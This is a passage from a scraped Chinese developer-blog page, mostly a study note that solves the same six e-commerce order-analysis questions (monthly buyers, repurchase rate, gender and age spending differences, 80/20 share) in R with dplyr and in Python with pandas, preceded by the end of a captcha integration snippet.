&#x4E3A;string, &#x5FC5;&#x586B;</span><br><span class="line">                //todo:&#x6267;&#x884C;&#x4EBA;&#x673A;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x540E;&#x7684;&#x64CD;&#x4F5C;</span><br><span class="line">            },</span><br><span class="line">            fail:function(){//&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#x56DE;&#x8C03;&#x51FD;&#x6570;  </span><br><span class="line">                //todo:&#x6267;&#x884C;&#x4EBA;&#x673A;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#x540E;&#x7684;&#x64CD;&#x4F5C;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        var obj;</span><br><span class="line">        window.vaptcha(options,function(vaptcha_obj){</span><br><span class="line">            obj = vaptcha_obj;</span><br><span class="line">            obj.init();</span><br><span class="line">        });</span><br><span class="line">});</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>&#x6210;&#x529F;&#x663E;&#x793A;<br><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/88038a97ca9cd8e87905d396c7e9f2ff8fe7750f256fb5d05c1ae60dd82bb7fc" alt="file"></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/4fca5bd34ac30ba93e149789fb77cba6.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520072630286.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520072630286.html" itemprop="url">左手用R右手Python系列——七周数据分析师学习笔记R语言</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T10:52:23+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x4E0A;&#x4E00;&#x7BC7;&#x6211;&#x91CD;&#x70B9;&#x5199;&#x4E86;&#x79E6;&#x8DEF;&#x8001;&#x5E08;&#x5728;&#x4E03;&#x5468;&#x6570;&#x636E;&#x5206;&#x6790;&#x5E08;&#x7CFB;&#x5217;&#x8BFE;&#x7A0B;&#x4E2D;MySQL&#x6A21;&#x5757;&#x7684;&#x5B9E;&#x6218;&#x4F5C;&#x4E1A;SQL&#x8BED;&#x6CD5;&#xFF0C;&#x5BF9;&#x6BD4;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x5197;&#x4F59;&#x601D;&#x8DEF;&#x4E0E;&#x8001;&#x5E08;&#x7684;&#x6700;&#x4F73;&#x601D;&#x8DEF;&#x3002;</p>
<p><a href="/external_links/aeb727e5a28c388c76172a0ef04c7378.html" target="blank" rel="noopener">MySQL&#x5165;&#x95E8;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;&#x2014;&#x2014;&#x4E03;&#x5468;&#x6570;&#x636E;&#x5206;&#x6790;&#x5E08;&#x5B9E;&#x6218;&#x4F5C;&#x4E1A;</a></p>
<p>&#x8FD9;&#x4E00;&#x7BC7;&#xFF0C;&#x4ECD;&#x7136;&#x662F;&#x76F8;&#x540C;&#x7684;&#x516D;&#x4E2A;&#x4E1A;&#x52A1;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x5C1D;&#x8BD5;&#x7740;R&#x8BED;&#x8A00;&#x3001;Python&#x590D;&#x76D8;&#x4E00;&#x904D;&#xFF0C;&#x8FD9;&#x6837;&#x4F60;&#x53EF;&#x4EE5;&#x5BF9;&#x6BD4;&#x540C;&#x6837;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#xFF0C;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x5DE5;&#x5177;&#x5904;&#x7406;&#x4E4B;&#x95F4;&#x7684;&#x6548;&#x7387;&#x3001;&#x903B;&#x8F91;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x4EE5;&#x53CA;&#x5404;&#x81EA;&#x7684;&#x4F18;&#x7F3A;&#x70B9;&#x3002;&#x5728;R&#x8BED;&#x8A00;&#x4EE3;&#x7801;&#x90E8;&#x5206;&#xFF0C;&#x9002;&#x5F53;&#x4F4D;&#x7F6E;&#x914C;&#x60C5;&#x505A;&#x4E86;&#x6CE8;&#x91CA;&#xFF0C;Python&#x90E8;&#x5206;&#x672A;&#x505A;&#x6CE8;&#x91CA;&#xFF0C;&#x8BF7;&#x8C28;&#x614E;&#x53C2;&#x8003;&#xFF01;</p>
<p>&#x9996;&#x5148;&#x5927;&#x81F4;&#x4ECB;&#x7ECD;&#x8FD9;&#x4E24;&#x4EFD;&#x6570;&#x636E;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;userinfo  &#x5BA2;&#x6237;&#x4FE1;&#x606F;&#x8868; </span><br><span class="line"> userId   &#x5BA2;&#x6237;id</span><br><span class="line"> gender   &#x6027;&#x522B;</span><br><span class="line"> brithday &#x51FA;&#x751F;&#x65E5;&#x671F;</span><br><span class="line"></span><br><span class="line">orderinfo &#x8BA2;&#x5355;&#x4FE1;&#x606F;&#x8868; </span><br><span class="line"> orderId  &#x8BA2;&#x5355;&#x5E8F;&#x53F7;&#xFF08;&#x865A;&#x62DF;&#x4E3B;&#x952E;&#xFF09;</span><br><span class="line"> userId   &#x5BA2;&#x6237;id</span><br><span class="line"> isPaid   &#x662F;&#x5426;&#x652F;&#x4ED8;</span><br><span class="line"> price    &#x5546;&#x54C1;&#x4EF7;&#x683C;</span><br><span class="line"> paidTime &#x652F;&#x4ED8;&#x65F6;&#x95F4;</span><br></pre></td></tr></table></figure>

<p>&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x8868;&#x683C;&#x662F;&#x672C;&#x6B21;&#x5206;&#x6790;&#x7684;&#x4E3B;&#x8981;&#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x4E2D;&#x5339;&#x914D;&#x5B57;&#x6BB5;&#x662F;userId&#x3002;</p>
<p>&#x672C;&#x6B21;&#x5206;&#x6790;&#x7684;&#x4E94;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;1&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x6708;&#x4EFD;&#x7684;&#x4E0B;&#x5355;&#x4EBA;&#x6570;&#xFF1B;</span><br><span class="line">2&#x3001;&#x7EDF;&#x8BA1;&#x7528;&#x6237;&#x4E09;&#x6708;&#x4EFD;&#x56DE;&#x8D2D;&#x7387;&#x548C;&#x590D;&#x8D2D;&#x7387;</span><br><span class="line">3&#x3001;&#x7EDF;&#x8BA1;&#x7537;&#x5973;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x9891;&#x6B21;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</span><br><span class="line">4&#x3001;&#x7EDF;&#x8BA1;&#x591A;&#x6B21;&#x6D88;&#x8D39;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x548C;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6D88;&#x8D39;&#x95F4;&#x9694;&#x662F;&#x591A;&#x5C11;&#xFF1F;</span><br><span class="line">5&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x5E74;&#x9F84;&#x6BB5;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x91D1;&#x989D;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</span><br><span class="line">6&#x3001;&#x7EDF;&#x8BA1;&#x6D88;&#x8D39;&#x7684;&#x4E8C;&#x516B;&#x6CD5;&#x5219;&#xFF0C;&#x6D88;&#x8D39;&#x7684;top20%&#x7528;&#x6237;&#xFF0C;&#x8D21;&#x732E;&#x4E86;&#x591A;&#x5C11;&#x989D;&#x5EA6;&#xFF1F;</span><br></pre></td></tr></table></figure>

<p><strong>R&#x8BED;&#x8A00;&#x7248;&#xFF1A;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;library(&quot;magrittr&quot;)</span><br><span class="line">library(&quot;plyr&quot;)</span><br><span class="line">library(&quot;dplyr&quot;)</span><br><span class="line">library(&quot;lubridate&quot;)</span><br><span class="line"></span><br><span class="line">userinfo   &lt;- read.csv(&quot;D:/R/File/userinfo.csv&quot;,stringsAsFactors = FALSE) </span><br><span class="line">orderinfo &lt;- read.csv(&quot;D:/R/File/orderinfo.csv&quot;,stringsAsFactors = FALSE)  </span><br><span class="line">userinfo$brithday &lt;- as.Date(userinfo$brithday)</span><br><span class="line">orderinfo$paidTime &lt;- as.Date(orderinfo$paidTime)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/2b427c9a32d18d238e445540a3dd7bfa41128d3bc62349d65696373dd4b4287b" alt><br><strong>1&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x6708;&#x4EFD;&#x7684;&#x4E0B;&#x5355;&#x4EBA;&#x6570;&#xFF1B;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;orderinfo %&gt;% filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) %&gt;%                                   </span><br><span class="line">              #&#x7B5B;&#x9009;&#x51FA;&#x5DF2;&#x652F;&#x4ED8;&#x8BA2;&#x5355;</span><br><span class="line">             transform(date_month = format(as.Date(.$paidTime),&apos;%Y-%m&apos;)) %&gt;%  </span><br><span class="line">              #&#x65B0;&#x5EFA;&#x6708;&#x5EA6;&#x53D8;&#x91CF;&#x6807;&#x7B7E;</span><br><span class="line">             select(userId,date_month) %&gt;%                                    </span><br><span class="line">              #&#x63D0;&#x53D6;&#x7528;&#x6237;ID&#xFF0C;&#x6708;&#x5EA6;&#x6807;&#x7B7E;</span><br><span class="line">             group_by(date_month) %&gt;%                                         </span><br><span class="line">              #&#x6309;&#x7167;&#x6708;&#x5EA6;&#x6807;&#x7B7E;&#x5206;&#x7EC4;</span><br><span class="line">             summarize(num_pep = n_distinct(userId))                          </span><br><span class="line">              #&#x5728;&#x5206;&#x7EC4;&#x57FA;&#x7840;&#x4E0A;&#x6309;&#x7167;&#x7528;&#x6237;ID&#x975E;&#x91CD;&#x590D;&#x8BA1;&#x6570;</span><br><span class="line"># A tibble: 3 x 2</span><br><span class="line">  date_month num_pep</span><br><span class="line">      &lt;fctr&gt;   &lt;int&gt;</span><br><span class="line">1    2016-03   54799</span><br><span class="line">2    2016-04   43967</span><br><span class="line">3    2016-05       6</span><br></pre></td></tr></table></figure>

<p><strong>2&#x3001;&#x7EDF;&#x8BA1;&#x7528;&#x6237;&#x4E09;&#x6708;&#x4EFD;&#x56DE;&#x8D2D;&#x7387;&#x548C;&#x590D;&#x8D2D;&#x7387;</strong></p>
<p>&#x590D;&#x8D2D;&#x7387;&#x8BA1;&#x7B97;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;1- (orderinfo %&gt;% filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; month(paidTime) == 3) %&gt;% .[!duplicated(.$userId),] %&gt;% nrow())/</span><br><span class="line">(orderinfo %&gt;% filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; month(paidTime) == 3) %&gt;%   nrow())</span><br></pre></td></tr></table></figure>

<p>&#x56DE;&#x8D2D;&#x7387;&#x8BA1;&#x7B97;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;#&#x8BA1;&#x7B97;&#x56DB;&#x6708;&#x8D2D;&#x4E70;&#x7684;&#x6D88;&#x8D39;&#x8005;</span><br><span class="line">four_m &lt;- orderinfo %&gt;%    </span><br><span class="line">          filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; month(paidTime) == 4) %&gt;%</span><br><span class="line">           #&#x7B5B;&#x9009;&#x56DB;&#x6708;&#x4EFD;&#x5DF2;&#x652F;&#x4ED8;&#x7528;&#x6237;</span><br><span class="line">          .[,&quot;userId&quot;] %&gt;%                                        </span><br><span class="line">          unique()     </span><br><span class="line"></span><br><span class="line">#&#x8BA1;&#x7B97;&#x4E09;&#x6708;&#x4EFD;&#x8D2D;&#x4E70;&#x7684;&#x6D88;&#x8D39;&#x8005;</span><br><span class="line">three_m &lt;- orderinfo %&gt;% </span><br><span class="line">          filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; month(paidTime) == 3) %&gt;%</span><br><span class="line">           .[!duplicated(.$userId),]</span><br><span class="line">(three_m %&gt;% filter(userId %in% four_m) %&gt;% nrow())/(three_m %&gt;% nrow())</span><br><span class="line">           0.2394022</span><br></pre></td></tr></table></figure>

<p><strong>3&#x3001;&#x7EDF;&#x8BA1;&#x7537;&#x5973;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x9891;&#x6B21;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;newdate &lt;- left_join(userinfo,orderinfo,by=&quot;userId&quot;)</span><br><span class="line"></span><br><span class="line">newdate %&gt;% filter(isPaid==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; gender !=&apos;&apos;) %&gt;%            </span><br><span class="line">        #&#x7B5B;&#x9009;&#x5DF2;&#x652F;&#x4ED8;&#x4E14;&#x6709;&#x6548;&#x7684;&#x8D2D;&#x4E70;&#x8BB0;&#x5F55;  </span><br><span class="line">        select(gender,userId) %&gt;% </span><br><span class="line">        group_by(gender,userId) %&gt;% summarize(num_sp=n())  %&gt;%  </span><br><span class="line">        #&#x6309;&#x7167;&#x6027;&#x522B;&#x3001;&#x7528;&#x6237;id&#x5206;&#x7EC4;&#x805A;&#x5408;&#x51FA;&#x603B;&#x4F53;&#x8D2D;&#x4E70;&#x9891;&#x6B21;   </span><br><span class="line">        select(gender,num_sp) %&gt;% group_by(gender) %&gt;%                </span><br><span class="line">        summarize(mean_sp=mean(num_sp))</span><br><span class="line">        #&#x6309;&#x7167;&#x6027;&#x522B;&#x805A;&#x5408;&#x51FA;&#x7537;&#x5973;&#x5E73;&#x5747;&#x8D2D;&#x4E70;&#x9891;&#x6B21;# A tibble: 2 x 2</span><br><span class="line">  gender  mean_sp</span><br><span class="line">   &lt;chr&gt;    &lt;dbl&gt;1     </span><br><span class="line">   &#x7537;     1.8035042</span><br><span class="line">   &#x5973;      1.782891</span><br></pre></td></tr></table></figure>

<p><strong>4&#x3001;&#x7EDF;&#x8BA1;&#x591A;&#x6B21;&#x6D88;&#x8D39;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x548C;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6D88;&#x8D39;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x662F;&#x591A;&#x5C11;&#xFF1F;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;newdata1 &lt;- orderinfo %&gt;% filter(isPaid==&apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) %&gt;% </span><br><span class="line">     select(userId,paidTime) %&gt;% </span><br><span class="line">     mutate(date=as.Date(paidTime))</span><br><span class="line">myreslut &lt;-data.frame(</span><br><span class="line">userId   = newdata1 %&gt;% arrange(userId,date)       %&gt;% .$userId %&gt;% unique(),</span><br><span class="line">ltime    = newdata1 %&gt;% arrange(userId,date)       %&gt;%  .[!duplicated(.$userId),] %&gt;% .$date,</span><br><span class="line">ptime    = newdata1 %&gt;% arrange(userId,desc(date)) %&gt;%  .[!duplicated(.$userId),] %&gt;% .$date,</span><br><span class="line">difftime = difftime(ptime,ltime,units = &quot;days&quot;)    </span><br><span class="line">) %&gt;% filter(difftime !=0)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/5b03fb95c2c118ee3121c39d6bb95a0eaa0e482c8e6fda57d2d4a1c24865ce20" alt><br><strong>5&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x5E74;&#x9F84;&#x6BB5;&#x7528;&#x6237;&#x6D88;&#x8D39;&#x91D1;&#x989D;&#x662F;&#x5426;&#x6709;&#x5DEE;&#x5F02;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;date1 &lt;-c(&apos;1960-01-01&apos;,&apos;1969-12-31&apos;,&apos;1979-12-31&apos;,&apos;1989-12-31&apos;,&apos;1999-12-31&apos;,&apos;2009-12-31&apos;,&apos;2017-12-07&apos;)</span><br><span class="line">newdate$trend &lt;- cut(newdate$brithday,breaks=as.Date(date1),labels=c(&apos;60&#x540E;&apos;,&apos;70&#x540E;&apos;,&apos;80&#x540E;&apos;,&apos;90&#x540E;&apos;,&apos;00&#x540E;&apos;,&apos;10&#x540E;&apos;),ordered=TRUE) </span><br><span class="line"></span><br><span class="line">newdate %&gt;% filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; gender != &apos;&apos;)  %&gt;% </span><br><span class="line">         group_by(trend) %&gt;% </span><br><span class="line">         summarize(mean_price=mean(price,na.rm=TRUE)) %&gt;% </span><br><span class="line">         na.omit</span><br><span class="line"> # A tibble: 6 x 2</span><br><span class="line">  trend mean_price</span><br><span class="line">  &lt;ord&gt;      &lt;dbl&gt;</span><br><span class="line"> 1  60&#x540E;   616.0806</span><br><span class="line">2  70&#x540E;   641.1010</span><br><span class="line">3  80&#x540E;   642.9074</span><br><span class="line">4  90&#x540E;   600.0559</span><br><span class="line">5  00&#x540E;   552.6973</span><br><span class="line">6  10&#x540E;   661.1364</span><br></pre></td></tr></table></figure>

<p><strong>6&#x3001;&#x7EDF;&#x8BA1;&#x6D88;&#x8D39;&#x7684;&#x4E8C;&#x516B;&#x6CD5;&#x5219;&#xFF0C;&#x6D88;&#x8D39;&#x7684;top20%&#x7528;&#x6237;&#xFF0C;&#x8D21;&#x732E;&#x4E86;&#x591A;&#x5C11;&#x989D;&#x5EA6;&#xFF1F;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;data6 &lt;- newdate %&gt;% filter(isPaid == &apos;&#x5DF2;&#x652F;&#x4ED8;&apos; &amp; gender != &apos;&apos;) %&gt;% </span><br><span class="line">         group_by(userId) %&gt;% </span><br><span class="line">         summarize(sum_sp=sum(price)) %&gt;% </span><br><span class="line">         arrange(-sum_sp)</span><br><span class="line">top20_ratio &lt;- sum(data6[1:round((nrow(data6)/5)),]$sum_sp)/sum(data6$sum_sp)</span><br></pre></td></tr></table></figure>

<p><strong>Python&#x7248;&#xFF1A;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">userinfo = pd.read_csv(&quot;D:/R/File/userinfo.csv&quot; ,encoding = &apos;gbk&apos;)</span><br><span class="line">orderinfo   = pd.read_csv(&quot;D:/R/File/orderinfo.csv&quot;,encoding = &apos;gbk&apos;)</span><br></pre></td></tr></table></figure>

<p><strong>1&#x3001;&#x7EDF;&#x8BA1;&#x4E0D;&#x540C;&#x6708;&#x4EFD;&#x7684;&#x4E0B;&#x5355;&#x4EBA;&#x6570;&#xFF1B;</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;userinfo1 = userinfo.dropna()</span><br><span class="line"></span><br><span class="line">userinfo1[&apos;brithday&apos;] = [datetime.strptime(x,&apos;%Y/%m/%d&apos;).strftime(&apos;%Y-%m-%d&apos;)  for x in userinfo1[&apos;brithday&apos;]]</span><br></pre></td></tr></table></figure>

<p>&#x53D1;&#x73B0;&#x5728;&#x8F6C;&#x5316;&#x65E5;&#x671F;&#x65F6;&#xFF0C;&#x6709;&#x51E0;&#x4E2A;&#x65E5;&#x671F;&#x65F6;&#x975E;&#x6CD5;&#x65E5;&#x671F;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x662F;&#x65E5;&#x671F;&#x5B57;&#x6BB5;&#x4E2D;&#x5B58;&#x5728;&#x7740;&#x810F;&#x6570;&#x636E;&#xFF0C;&#x76F4;&#x63A5;&#x5220;&#x9664;&#x6389;&#x5373;&#x53EF;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;errortime = []</span><br><span class="line">for i in userinfo1[&apos;brithday&apos;]:</span><br><span class="line">    try:</span><br><span class="line">        datetime.strptime(i,&apos;%Y/%m/%d&apos;)</span><br><span class="line">        pass</span><br><span class="line">    except:</span><br><span class="line">        errortime.append(i)</span><br><span class="line"></span><br><span class="line"> [&apos;1691-07-07 00:00:00.0&apos;, &apos;0072-09-28 00:00:00.0&apos;, &apos;1882-05-13 00:00:00.0&apos;, &apos;1069-09-26 00:00:00.0&apos;]</span><br><span class="line">userinfo1 = userinfo1.loc[[x not in errortime for x in userinfo1[&apos;brithday&apos;]],]</span><br><span class="line">userinfo1[&apos;brithday&apos;] = [datetime.strptime(x,&apos;%Y/%m/%d&apos;).strftime(&apos;%Y-%m-%d&apos;)  for x in userinfo1[&apos;brithday&apos;]]</span><br><span class="line">orderinfo1 = orderinfo.dropna()</span><br><span class="line">orderinfo1[&apos;paidTime&apos;] = [datetime.strptime(x,&apos;%Y/%m/%d %H:%M&apos;).strftime(&apos;%Y-%m-%d&apos;)  for x in orderinfo1[&apos;paidTime&apos;]]</span><br><span class="line">orderinfo1[&apos;date_month&apos;] = [datetime.strptime(x,&apos;%Y-%m-%d&apos;).strftime(&apos;%Y-%m&apos;) for x in orderinfo1[&apos;paidTime&apos;]]</span><br><span class="line">orderinfo1.query(&apos;isPaid == &quot;&#x5DF2;&#x652F;&#x4ED8;&quot;&apos;).groupby(&apos;date_month&apos;)[&apos;userId&apos;].count()date_month</span><br><span class="line">2016-03    238474</span><br><span class="line">2016-04    223324</span><br><span class="line">2016-05    7</span><br><span class="line">Name: userId, dtype: int64</span><br></pre></td></tr></table></figure>

<p><strong>2&#x3001;&#x7EDF;&#x8BA1;&#x7528;&#x6237;&#x4E09;&#x6708;&#x4EFD;&#x56DE;&#x8D2D;&#x7387;&#x548C;&#x590D;&#x8D2D;&#x7387;</strong></p>
<p>&#x590D;&#x8D2D;&#x7387;&#x8BA1;&#x7B97;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;nodup = orderinfo1.loc[(orderinfo1[&apos;isPaid&apos;]== &apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) &amp; (orderinfo1[&apos;date_month&apos;] == &apos;2016-03&apos;),&apos;userId&apos;].duplicated().sum()</span><br><span class="line">allnum= orderinfo1.loc[(orderinfo1[&apos;isPaid&apos;]== &apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) &amp; (orderinfo1[&apos;date_month&apos;] == &apos;2016-03&apos;),&apos;userId&apos;].count()1-nodup/allnum</span><br><span class="line">0.22979024967082362</span><br></pre></td></tr></table></figure>

<p>&#x56DE;&#x8D2D;&#x7387;&#x8BA1;&#x7B97;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;#&#x8BA1;&#x7B97;&#x56DB;&#x6708;&#x8D2D;&#x4E70;&#x7684;&#x6D88;&#x8D39;&#x8005;</span><br><span class="line">four_m  = orderinfo1.loc[(orderinfo1[&apos;isPaid&apos;]== &apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) &amp; (orderinfo1[&apos;date_month&apos;] == &apos;2016-04&apos;),].drop_duplicates(&apos;userId&apos;)</span><br><span class="line">#&#x8BA1;&#x7B97;&#x4E09;&#x6708;&#x4EFD;&#x8D2D;&#x4E70;&#x7684;&#x6D88;&#x8D39;&#x8005;</span><br><span class="line">three_m = orderinfo1.loc[(orderinfo1[&apos;isPaid&apos;]== &apos;&#x5DF2;&#x652F;&#x4ED8;&apos;) &amp; (orderinfo1[&apos;date_month&apos;] == &apos;2016-03&apos;),].drop_duplicates(&apos;userId&apos;)  </span><br><span class="line"></span><br><span class="line">len(three_m.loc[[x in four_m[&apos;userId&apos;] for x in three_m[&apos;userId&apos;]],])/len(three_m)</span><br><span class="line">len(set(four_m[&apos;userId&apos;]) &amp; 